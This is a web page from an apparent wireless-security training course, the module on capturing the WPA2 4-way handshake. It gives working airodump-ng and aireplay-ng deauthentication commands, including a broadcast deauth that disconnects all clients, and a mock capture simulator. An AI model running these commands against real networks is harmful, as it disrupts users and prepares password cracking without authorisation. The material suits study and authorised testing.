@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Module 06 — WPA2 Handshake | WiFi Exploitation Course</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
+      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
+      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
+      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
+      --font-body:'Segoe UI',system-ui,sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
+    .page-wrapper { display:flex; min-height:100vh; }
+
+    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
+    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
+    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
+    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
+    .sidebar-nav { padding:16px 0; }
+    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
+    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
+    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
+    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
+    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
+    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }
+
+    main { flex:1; padding:48px 64px; max-width:960px; }
+
+    .module-header { margin-bottom:40px; }
+    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
+    .breadcrumb a { color:var(--accent); text-decoration:none; }
+    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
+    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
+    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
+    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
+    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
+    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }
+
+    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
+    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
+    .warning-box strong { color:#e3b341; }
+
+    section { margin-bottom:52px; }
+    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
+    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
+    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
+    p { margin-bottom:12px; }
+
+    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
+    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .terminal-dots { display:flex; gap:6px; }
+    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
+    .d-red { background:#f78166; } .d-yellow { background:#e3b341; } .d-green { background:#3fb950; }
+    .terminal-title { font-size:11px; color:var(--text-dim); }
+    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
+    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
+    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
+    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
+    .prompt { color:var(--accent2); user-select:none; }
+    .cmd { color:#e6edf3; }
+    .flag { color:#ffa657; }
+    .str { color:#a5d6ff; }
+    .cmt { color:#6e7681; font-style:italic; }
+    .out { color:var(--text-dim); }
+    .out-ok { color:var(--accent2); }
+    .out-warn { color:var(--warn); }
+    .out-err { color:var(--accent3); }
+
+    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
+    table { width:100%; border-collapse:collapse; font-size:13px; }
+    thead tr { background:rgba(88,166,255,0.06); }
+    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
+    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
+    tr:last-child td { border-bottom:none; }
+    tr:hover td { background:rgba(88,166,255,0.03); }
+    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }
+
+    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
+    .callout.info { background:rgba(88,166,255,0.07); border-left:3px solid var(--accent); }
+    .callout.attack { background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
+    .callout.tip { background:rgba(63,185,80,0.07); border-left:3px solid var(--accent2); }
+    .callout.warn { background:rgba(210,153,34,0.07); border-left:3px solid var(--warn); }
+    .callout .ci { flex-shrink:0; font-size:16px; }
+    .callout strong { color:var(--text-head); }
+
+    /* Handshake diagram */
+    .handshake-flow { display:flex; justify-content:space-between; align-items:center; margin:24px 0; flex-wrap:wrap; gap:16px; }
+    .hs-msg { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; text-align:center; flex:1; min-width:150px; }
+    .hs-msg h4 { font-size:12px; color:var(--text-head); margin-bottom:8px; }
+    .hs-msg .num { display:inline-block; width:28px; height:28px; border-radius:50%; background:var(--accent); color:#0d1117; font-weight:bold; line-height:28px; margin-bottom:10px; font-size:14px; }
+    .hs-msg .contents { font-size:11px; color:var(--text-dim); font-family:var(--font-mono); line-height:1.7; }
+    .hs-arrow { color:var(--text-dim); font-size:24px; }
+    .hs-ap { color:var(--accent2); }
+    .hs-client { color:var(--accent); }
+
+    /* Capture method cards */
+    .capture-methods { display:grid; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:16px; margin:20px 0; }
+    .capture-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; }
+    .capture-card h4 { font-size:14px; color:var(--text-head); margin-bottom:10px; }
+    .capture-card .pros { font-size:12px; color:var(--accent2); margin-bottom:6px; }
+    .capture-card .cons { font-size:12px; color:var(--accent3); }
+
+    /* Capture simulator */
+    .capture-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
+    .capture-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
+    .sim-controls { display:flex; gap:12px; margin-bottom:16px; flex-wrap:wrap; align-items:flex-end; }
+    .sim-control { display:flex; flex-direction:column; gap:6px; }
+    .sim-control label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
+    .sim-control select, .sim-control input { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; }
+    .sim-control select:focus, .sim-control input:focus { border-color:var(--accent); }
+    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; }
+    .sim-btn:hover { background:#79c0ff; }
+    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:140px; white-space:pre-wrap; }
+    .sim-spinner { display:inline-block; animation:spin 0.8s linear infinite; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    /* Nav footer */
+    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
+    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
+    .nav-btn.next { background:var(--accent); color:#0d1117; }
+    .nav-btn.next:hover { background:#79c0ff; }
+    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
+    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
+
+    ::-webkit-scrollbar { width:6px; height:6px; }
+    ::-webkit-scrollbar-track { background:var(--bg); }
+    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }
+
+    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
+  </style>
+</head>
+<body>
+<div class="page-wrapper">
+
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="course-title">WiFi Exploitation Course</div>
+      <h2>Wireless Security</h2>
+    </div>
+    <nav class="sidebar-nav">
+      <div class="sidebar-section-label">Tier 1 — Foundations</div>
+      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
+      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
+      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
+      <div class="sidebar-section-label">Tier 2 — Recon</div>
+      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
+      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
+      <div class="sidebar-section-label">Tier 3 — Legacy</div>
+      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
+      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
+      <a href="#" class="active"><span class="mod-num">06</span> WPA2 Handshake</a>
+      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
+      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
+      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
+      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
+      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
+      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
+      <div class="sidebar-section-label">Tier 7 — WPS</div>
+      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
+      <div class="sidebar-section-label">Tier 8 — Modern</div>
+      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
+      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
+      <div class="sidebar-section-label">Tier 9 — Chaining</div>
+      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
+    </nav>
+  </aside>
+
+  <main>
+    <div class="module-header">
+      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 06</div>
+      <div class="module-badge">&#9679; Tier 4 &mdash; WPA2-Personal</div>
+      <h1>Capturing the WPA2 4-Way Handshake</h1>
+      <p class="subtitle">Learn to capture the WPA2 handshake — the critical first step for offline password cracking. Covers passive and active capture techniques, deauthentication attacks, and verification methods.</p>
+      <div class="meta-row">
+        <div class="meta-pill"><span class="dot" style="background:#3fb950"></span> Beginner</div>
+        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~40 min</div>
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Adapter required</div>
+      </div>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Legal Notice:</strong> Handshake capture techniques must only be used on networks you own or have explicit written authorization to test. Deauthentication attacks are considered active reconnaissance and may be illegal in your jurisdiction.</p>
+    </div>
+
+    <!-- Section 1: The Handshake -->
+    <section id="handshake">
+      <h2><span class="section-num">01</span> The 4-Way Handshake Explained</h2>
+      <p>The handshake establishes session keys without transmitting the password. Each message serves a specific purpose:</p>
+
+      <div class="handshake-flow">
+        <div class="hs-msg">
+          <div class="num">1</div>
+          <h4><span class="hs-ap">AP</span> &#8594; Client</h4>
+          <div class="contents">ANonce<br>(random value)</div>
+        </div>
+        <div class="hs-arrow">&#8594;</div>
+        <div class="hs-msg">
+          <div class="num">2</div>
+          <h4><span class="hs-client">Client</span> &#8594; AP</h4>
+          <div class="contents">SNonce + MIC<br>+ RSN IE</div>
+        </div>
+        <div class="hs-arrow">&#8594;</div>
+        <div class="hs-msg">
+          <div class="num">3</div>
+          <h4><span class="hs-ap">AP</span> &#8594; Client</h4>
+          <div class="contents">ANonce + GTK<br>+ MIC</div>
+        </div>
+        <div class="hs-arrow">&#8594;</div>
+        <div class="hs-msg">
+          <div class="num">4</div>
+          <h4><span class="hs-client">Client</span> &#8594; AP</h4>
+          <div class="contents">Confirm<br>+ MIC</div>
+        </div>
+      </div>
+
+      <div class="callout info">
+        <span class="ci">&#128269;</span>
+        <div><strong>Why it can be cracked:</strong> The handshake contains public values (nonces) and a MIC (Message Integrity Code). By trying passwords offline, we can derive the PMK and compute the MIC to verify if a password is correct.</div>
+      </div>
+    </section>
+
+    <!-- Section 2: Capture Methods -->
+    <section id="methods">
+      <h2><span class="section-num">02</span> Handshake Capture Methods</h2>
+
+      <div class="capture-methods">
+        <div class="capture-card">
+          <h4>&#128129; Passive Capture</h4>
+          <div class="pros">+ Completely stealthy</div>
+          <div class="pros">+ No frames transmitted</div>
+          <div class="cons">- Can take very long</div>
+          <p style="margin-top:12px;font-size:12px;">Wait for a client to naturally connect. Use when you have time and need stealth.</p>
+        </div>
+        
+        <div class="capture-card">
+          <h4>&#9889; Deauth Attack</h4>
+          <div class="pros">+ Fast (seconds)</div>
+          <div class="pros">+ Reliable</div>
+          <div class="cons">- Active/visible</div>
+          <p style="margin-top:12px;font-size:12px;">Force clients to reconnect by sending deauthentication frames. Most common method.</p>
+        </div>
+
+        <div class="capture-card">
+          <h4>&#128268; hcxdumptool</h4>
+          <div class="pros">+ Captures PMKID too</div>
+          <div class="pros">+ Modern, efficient</div>
+          <div class="cons">- Requires new tool</div>
+          <p style="margin-top:12px;font-size:12px;">Advanced tool for capturing handshakes and PMKIDs in various formats.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 3: Commands -->
+    <section id="commands">
+      <h2><span class="section-num">03</span> Capture Commands</h2>
+      <p>Execute these commands in separate terminals for best results.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Terminal 1: Start capture</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-cap1')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-cap1"><span class="cmt"># Target specific WPA2 network and capture handshakes</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-w</span> <span class="str">handshake</span> wlan0mon</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Terminal 2: Send deauth (in new terminal)</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-cap2')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-cap2"><span class="cmt"># Broadcast deauth - disconnects everyone</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">10</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan0mon</span>
+
+<span class="cmt"># Or target specific client</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">10</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Verify handshake</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-cap3')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-cap3"><span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aircrack-ng <span class="str">handshake-01.cap</span></span>
+<span class="out">Opening handshake-01.cap</span>
+<span class="out">Read 1524 packets.</span>
+<span class="out">#  BSSID              ESSID         Encryption</span>
+<span class="out-ok">1  AA:BB:CC:DD:EE:FF  MyNetwork    WPA2 (1) handshake</span></div>
+      </div>
+    </section>
+
+    <!-- Section 4: Simulator -->
+    <section id="simulator">
+      <h2><span class="section-num">04</span> Handshake Capture Simulator</h2>
+      <p>Configure and simulate a handshake capture scenario.</p>
+
+      <div class="capture-sim">
+        <h3>&#128301; Handshake Capture Simulation</h3>
+        <div class="sim-controls">
+          <div class="sim-control">
+            <label>Capture Method</label>
+            <select id="capMethod">
+              <option value="passive">Passive (wait for client)</option>
+              <option value="deauth">Deauth Attack</option>
+              <option value="hcx">hcxdumptool</option>
+            </select>
+          </div>
+          <div class="sim-control">
+            <label>Client Status</label>
+            <select id="capClient">
+              <option value="connected">Client connected</option>
+              <option value="none">No clients nearby</option>
+            </select>
+          </div>
+          <button class="sim-btn" onclick="runCaptureSim()">Capture Handshake</button>
+        </div>
+        <div class="sim-output" id="simOutput"><span style="color:var(--text-dim);">Configure options above and click "Capture Handshake"...</span></div>
+      </div>
+    </section>
+
+    <!-- Nav -->
+    <div class="nav-footer">
+      <a href="../module-05-wep-cracking/" class="nav-btn prev">&#8592; Module 05: WEP Cracking</a>
+      <a href="../module-07-wpa2-cracking/" class="nav-btn next">Module 07: WPA2 Cracking &#8594;</a>
+    </div>
+  </main>
+</div>
+
+<script>
+  // Copy terminal
+  function copyTerm(btn, id) {
+    const el = document.getElementById(id);
+    const text = el.innerText || el.textContent;
+    navigator.clipboard.writeText(text.trim()).then(() => {
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  // Capture simulation
+  function runCaptureSim() {
+    const method = document.getElementById('capMethod').value;
+    const client = document.getElementById('capClient').value;
+    const output = document.getElementById('simOutput');
+
+    output.innerHTML = '<span class="sim-spinner">⟳</span> Starting capture...';
+
+    setTimeout(() => {
+      let lines = [];
+      
+      if (method === 'passive') {
+        lines.push('<span style="color:var(--accent2)">[✓]</span> Monitor mode enabled');
+        lines.push('<span style="color:var(--text-dim)">Waiting for client to authenticate...</span>');
+        
+        setTimeout(() => {
+          lines.push('<span style="color:var(--accent2)">[+]</span> Client connected: 11:22:33:44:55:66');
+          lines.push('<span style="color:var(--accent2)">[+]</span> EAPOL Message 1 captured (ANonce)');
+          lines.push('<span style="color:var(--accent2)">[+]</span> EAPOL Message 2 captured (SNonce + MIC)');
+          lines.push('<span style="color:var(--accent2)">[+]</span> EAPOL Message 3 captured');
+          lines.push('<span style="color:var(--accent2)">[+]</span> EAPOL Message 4 captured');
+          lines.push('');
+          lines.push('<span style="color:var(--accent2)">KEY FOUND! WPA2 Handshake captured successfully</span>');
+          output.innerHTML = lines.join('\n');
+        }, 2000);
+        
+      } else if (method === 'deauth') {
+        if (client === 'none') {
+          lines.push('<span style="color:var(--warn)">[!]</span> No clients connected');
+          lines.push('<span style="color:var(--text-dim)">Waiting for client...</span>');
+          setTimeout(() => {
+            lines.push('<span style="color:var(--accent2)">[+]</span> Client joined: 11:22:33:44:55:66');
+            lines.push('<span style="color:var(--accent2)">[✓]</span> Sending deauth attack...');
+            setTimeout(() => {
+              lines.push('<span style="color:var(--accent2)">[+]</span> WPA2 Handshake captured!');
+              output.innerHTML = lines.join('\n');
+            }, 1500);
+            output.innerHTML = lines.join('\n');
+          }, 1500);
+        } else {
+          lines.push('<span style="color:var(--accent2)">[✓]</span> Sending deauth to 11:22:33:44:55:66');
+          lines.push('<span style="color:var(--accent2)">[✓]</span> Client reconnected');
+          lines.push('<span style="color:var(--accent2)">[+]</span> Captured 4-way handshake');
+          lines.push('');
+          lines.push('<span style="color:var(--accent2)">SUCCESS! Handshake saved to capture-01.cap</span>');
+        }
+      } else {
+        lines.push('<span style="color:var(--accent2)">[✓]</span> hcxdumptool started');
+        lines.push('<span style="color:var(--text-dim)">Scanning for targets...</span>');
+        setTimeout(() => {
+          lines.push('<span style="color:var(--accent2)">[+]</span> Found: MyNetwork (AA:BB:CC:DD:EE:FF)');
+          lines.push('<span style="color:var(--accent2)">[+]</span> Sending PMKID request...');
+          lines.push('<span style="color:var(--accent2)">[+]</span> Received PMKID');
+          lines.push('<span style="color:var(--accent2)">[+]</span> Captured WPA2 handshake');
+          lines.push('');
+          lines.push('<span style="color:var(--accent2)">SUCCESS! Handshake + PMKID captured</span>');
+          output.innerHTML = lines.join('\n');
+        }, 1500);
+      }
+      
+      output.innerHTML = lines.join('\n');
+    }, 500);
+  }
+</script>
+</body>
+</html>
